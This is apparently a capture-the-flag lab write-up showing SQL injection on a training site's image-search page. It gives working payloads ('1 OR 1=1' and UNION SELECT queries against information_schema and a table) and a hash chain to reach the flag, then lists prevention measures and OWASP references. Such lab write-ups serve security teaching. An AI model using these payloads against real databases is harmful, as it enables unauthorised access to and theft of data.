# Vulnerability

SQL injection allow you to access and manipulate all your datas.

# Identification

# Resolve

Go to http://10.11.249.210/?page=searchimg
Fill the form
1 OR 1=1 and submit (http://10.11.249.210/?page=searchimg&id=1+OR+1%3D1&Submit=Submit#)
It will show all users and we are sure about the vulnerability

Now, we will get all columns and tables from DB
1 UNION SELECT table_name, column_name FROM information_schema.columns

Table name:

- list_images

Columns name:

- id
- url
- title
- comment

We will parse all columns and find what we need

1 UNION SELECT id, concat(id, url, title, comment) FROM list_images

countersign->md5->lower->sha256->flag

# Prevent

- Use of Prepared Statements (with Parameterized Queries)
- Use of Properly Constructed Stored Procedures
- Allow-list Input Validation
- STRONGLY DISCOURAGED: Escaping All User Supplied Input

# Resources

https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html<br>
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection<br>
https://www.dcode.fr/md5-hash<br>
https://www.dcode.fr/sha256-hash
